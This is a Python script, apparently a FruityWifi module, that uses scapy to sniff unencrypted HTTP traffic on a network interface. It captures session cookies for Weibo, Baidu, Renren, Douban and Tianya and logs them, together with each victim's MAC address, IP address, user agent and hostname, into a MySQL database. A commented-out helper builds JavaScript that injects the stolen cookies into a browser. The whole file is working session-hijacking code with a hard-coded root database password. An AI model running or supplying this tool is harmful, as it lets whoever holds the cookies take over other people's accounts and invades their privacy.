#!/usr/bin/env python

import sys, os, MySQLdb, json, time
from scapy.all import *

dhcp_lease_file='/usr/share/FruityWifi/logs/dhcp.leases'

keyCookies={'weibo.com':['SSOLoginState'],'weibo.cn':['SSOLoginState'],'renren.com':['p'],'www.renren.com':['p'],'baidu.com':['BDUSS'],'www.baidu.com':['BDUSS'],'douban.com':['dbcl2'],'tianya.cn':['sso','temp','temp4','user']}
blackList=['img','cdn','css','googleads','w55c','doubleclick.net','api','captcha','click','sinajs','aliyuncs','isdspeed','openmobile','ptlogin2','alipay','android.clients','suggestion','configsvr','hiphotos.baidu','cootekservice.com','photo','conf','static','appsupport.qq.com','bdstatic','uu.qq.com','statistic','10.187.0.1']

def isRoot():
	"""Verifies if the current user is root"""
	return os.getuid() & os.getgid() == 0
	
def dictStringValue(raw_values):
	index = raw_values.find('=')
	value0 = raw_values[:index]
	value1 = raw_values[index+1:]
	return {value0.strip():value1.strip()}
	
def cookieIntoDict(raw_cookie):
	cookie_list = raw_cookie.split(';') 
	cookie = {}
	for element in cookie_list:
		try:
			cookie.update(dictStringValue(element))
		except IndexError:
			pass
	return cookie
	
def extractCookie(headers):
	raw_cookie =""
	for line in headers.split('\n'):   
		if 'Cookie:' in line:
			raw_cookie = line
	return cookieIntoDict(raw_cookie[len("Cookie: "):])
							 
def jsCookie(dictCookie):			
		return ''.join(['void(document.cookie="' + key + '=' + dictCookie[key]+ '");' for key in dictCookie.keys()])		

def printCookie(cookie):
	for key in cookie.keys():
		print "%s = %s" % (key,cookie[key])
#       print "[*] Javascript Injection code:"
#	print 'javascript:' + jsCookie(cookie) + '\n'
	
def sniffCookies(p):
	global keyCookies,blackList
	load=getattr(p,'load','')
	if 'Cookie:' in load and 'User-Agent:' in load and 'Host:' in load:
		clientMAC=''
		clientIP=''
		domain=''
		userAgent=''
		headers = dict(re.findall(r"(?P<name>.*?): (?P<value>.*?)\r\n", load+"\r\n"))
		if 'Set-Cookie:' in load:
			return
			cookie = cookieIntoDict(headers['Set-Cookie'])
			if 'Domain' not in cookie:
				return
			domain=cookie['Domain']
			if p.haslayer('Ether'):
				clientMAC=p.src
				clientIP=p['IP'].src
			else:
				clientIP=p['IP'].src
		else:
			cookie = cookieIntoDict(headers['Cookie'])
			domain=headers['Host']
			userAgent=headers['User-Agent']
			if p.haslayer('Ether'):
				clientMAC=p.src
				clientIP=p['IP'].src
			else:
				clientIP=p['IP'].src

		for bl in blackList:
			if bl in domain:
				return
		if domain in keyCookies:
			flag=False
			#print cookie
			for key in keyCookies[domain]:
				#print key
				if key not in cookie:
					flag=True
					break
			if flag:
				return

		hostname=getHostname(clientMAC)
		cookie_json=json.dumps(cookie,sort_keys=True,separators=(',',':'))
		cookie_json=MySQLdb.escape_string(cookie_json)
		clientIP=MySQLdb.escape_string(clientIP)
		clientMAC=MySQLdb.escape_string(clientMAC)
		userAgent=MySQLdb.escape_string(userAgent)
		hostname=MySQLdb.escape_string(hostname)
		domain=MySQLdb.escape_string(domain)
		db = MySQLdb.connect('localhost','root','netcenter','cookies')
		cursor = db.cursor()
		db_filter = 'clientMAC=\''+clientMAC+'\' AND domain=\''+domain+'\''
		cursor.execute('SELECT * FROM cookies WHERE '+db_filter)
		rowcount=cursor.rowcount
		if rowcount>0:
			origin_cookie=cursor.fetchall()
			origin_cookie=origin_cookie[0][2]
			#if origin_cookie==json.dumps(cookie,sort_keys=True,separators=(',',':')):
			#	db.close()
			#	return
			sql = "UPDATE cookies SET cookie='"+cookie_json+"',clientIP='"+clientIP+"',userAgent='"+userAgent+"',hostname='"+hostname+"' WHERE "+db_filter
			#try:
			cursor.execute(sql)
			db.commit()
			#except:
			#	db.rollback()
			print 'Cookie updated for',clientMAC,clientIP,hostname,domain
		else:
			sql = "INSERT INTO cookies (domain,cookie,clientMAC,clientIP,userAgent,hostname) VALUES ('"+domain+"','"+cookie_json+"','"+clientMAC+"','"+clientIP+"','"+userAgent+"','"+hostname+"')"
			#try:
			cursor.execute(sql)
			db.commit()
			#except:
			#	db.rollback()
			print 'New Cookie Captured'
			print clientMAC,clientIP,hostname,domain
			print cookie,'\n'
		db.close()

def getHostname(mac):
	global dhcp_lease_file
	with open(dhcp_lease_file) as f:
		lease=f.read()
		f.close()
	for line in lease.split('\n'):
		data=line.split(' ')
		if len(data)==5 and data[1].lower()==mac.lower():
			return data[3]
	return ''

def printUsage():
	print "Usage: %s IFACE " % sys.argv[0]
	
if __name__ == "__main__":
	if len(sys.argv) < 2:
		printUsage()
		sys.exit(0)
		
	if not isRoot():
		print "[-] Your have to be root to sniff interfaces"
		sys.exit(0)
									 		
	interface = sys.argv[1]
	#sniff(iface=interface,filter="tcp port 80",prn=sniffCookies)
	while True:
		try:
			sniff(iface=interface,prn=sniffCookies)
			break
		except:
			print 'something wrong, wait for 5s before restarting'
			time.sleep(5)
